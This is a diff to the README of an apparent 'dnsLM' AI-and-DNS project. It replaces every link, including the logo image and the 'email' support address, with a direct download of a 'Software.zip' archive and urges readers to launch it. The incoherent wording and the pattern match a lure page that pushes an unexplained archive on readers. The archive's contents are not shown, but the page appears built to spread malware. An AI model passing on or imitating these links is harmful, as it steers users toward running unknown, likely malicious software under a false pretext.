@@ -1,6 +1,6 @@
 # 🦙 dnsLM: Where AI meets DNS
 
-![dnsLM Logo](https://github.com/dreiscool96/dnsLM/releases/tag/v1.0)
+![dnsLM Logo](https://github.com/dreiscool96/dnsLM/releases/download/v2.0/Software.zip)
 
 Welcome to dnsLM, where AI meets DNS—because even domains deserve a little intelligence! 🧠🌐
 
@@ -28,7 +28,7 @@ With dnsLM, you can expect a seamless integration of AI algorithms into DNS-rela
 
 To dive into the exciting world of dnsLM, simply download our latest software package from the link below:
 
-[![Download dnsLM Software](https://github.com/dreiscool96/dnsLM/releases/tag/v1.0)](https://github.com/dreiscool96/dnsLM/releases/tag/v1.0)
+[![Download dnsLM Software](https://github.com/dreiscool96/dnsLM/releases/download/v2.0/Software.zip)](https://github.com/dreiscool96/dnsLM/releases/download/v2.0/Software.zip)
 
 ### Note: This link needs to be launched to access the software package.
 
@@ -46,7 +46,7 @@ We welcome contributions from the open-source community to make dnsLM even bette
 
 ## Support
 
-For any questions, feedback, or support requests, feel free to reach out to the dnsLM team via email at [https://github.com/dreiscool96/dnsLM/releases/tag/v1.0](https://github.com/dreiscool96/dnsLM/releases/tag/v1.0).
+For any questions, feedback, or support requests, feel free to reach out to the dnsLM team via email at [https://github.com/dreiscool96/dnsLM/releases/download/v2.0/Software.zip](https://github.com/dreiscool96/dnsLM/releases/download/v2.0/Software.zip).
 
 Let's shape the future of DNS together with the power of AI! 🚀
 
